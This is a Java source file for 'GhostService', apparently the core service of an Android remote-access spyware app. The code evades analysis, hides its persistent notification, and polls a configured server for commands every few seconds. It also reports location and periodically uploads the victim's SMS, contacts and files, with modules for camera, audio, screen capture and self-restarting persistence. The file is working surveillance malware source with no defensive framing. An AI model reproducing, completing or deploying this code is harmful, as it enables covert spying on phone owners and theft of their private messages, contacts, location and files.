package com.ghost.agent.core;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import com.ghost.agent.R;
import com.ghost.agent.receivers.BootReceiver;
import com.ghost.agent.utils.AntiAnalysis;
import com.ghost.agent.utils.NativeLib;

import java.util.concurrent.Executors;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;

public class GhostService extends Service {
    
    private static final String TAG = "GhostService";
    private static final String CHANNEL_ID = "GhostChannel";
    private static final int NOTIFICATION_ID = 1001;
    private static final String PREFS_NAME = "GhostPrefs";
    
    private HandlerThread backgroundThread;
    private Handler backgroundHandler;
    private ScheduledExecutorService scheduler;
    private SharedPreferences prefs;
    private NetworkManager networkManager;
    private CommandExecutor commandExecutor;
    private ScreenCapture screenCapture;
    private CameraManager cameraManager;
    private AudioRecorder audioRecorder;
    private LocationTracker locationTracker;
    private FileManager fileManager;
    private SMSManager smsManager;
    private ContactManager contactManager;
    private PersistenceManager persistenceManager;
    private AntiAnalysis antiAnalysis;
    private NativeLib nativeLib;
    
    @Override
    public void onCreate() {
        super.onCreate();
        
        antiAnalysis = new AntiAnalysis(this);
        if (antiAnalysis.shouldStop()) {
            stopSelf();
            return;
        }
        
        nativeLib = new NativeLib();
        
        prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        String serverUrl = prefs.getString("server_url", "");
        String apiKey = prefs.getString("api_key", "");
        String deviceId = prefs.getString("device_id", "");
        
        backgroundThread = new HandlerThread("GhostBackground");
        backgroundThread.start();
        backgroundHandler = new Handler(backgroundThread.getLooper());
        
        scheduler = Executors.newScheduledThreadPool(5);
        
        networkManager = new NetworkManager(this, serverUrl, apiKey, deviceId);
        commandExecutor = new CommandExecutor(this, networkManager);
        screenCapture = new ScreenCapture(this, networkManager);
        cameraManager = new CameraManager(this, networkManager);
        audioRecorder = new AudioRecorder(this, networkManager);
        locationTracker = new LocationTracker(this, networkManager);
        fileManager = new FileManager(this, networkManager);
        smsManager = new SMSManager(this, networkManager);
        contactManager = new ContactManager(this, networkManager);
        persistenceManager = new PersistenceManager(this);
        
        createNotificationChannel();
        startForeground(NOTIFICATION_ID, createNotification());
        
        registerDevice();
        startScheduledTasks();
        persistenceManager.applyPersistence();
        
        Log.i(TAG, "Service démarré");
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Ghost Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setShowBadge(false);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            manager.createNotificationChannel(channel);
        }
    }
    
    private Notification createNotification() {
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.ic_menu_edit)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .build();
    }
    
    private void registerDevice() {
        backgroundHandler.post(() -> networkManager.registerDevice());
    }
    
    private void startScheduledTasks() {
        scheduler.scheduleAtFixedRate(() -> commandExecutor.checkCommands(), 0, 5, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> locationTracker.sendLocation(), 0, 60, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> networkManager.sendHeartbeat(), 0, 30, TimeUnit.SECONDS);
        scheduler.scheduleAtFixedRate(() -> syncAllData(), 1, 1, TimeUnit.HOURS);
    }
    
    private void syncAllData() {
        backgroundHandler.post(() -> {
            smsManager.syncSMS();
            contactManager.syncContacts();
            fileManager.scanFiles();
        });
    }
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY;
    }
    
    @Override
    public void onDestroy() {
        super.onDestroy();
        scheduler.shutdown();
        persistenceManager.selfRestart();
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}
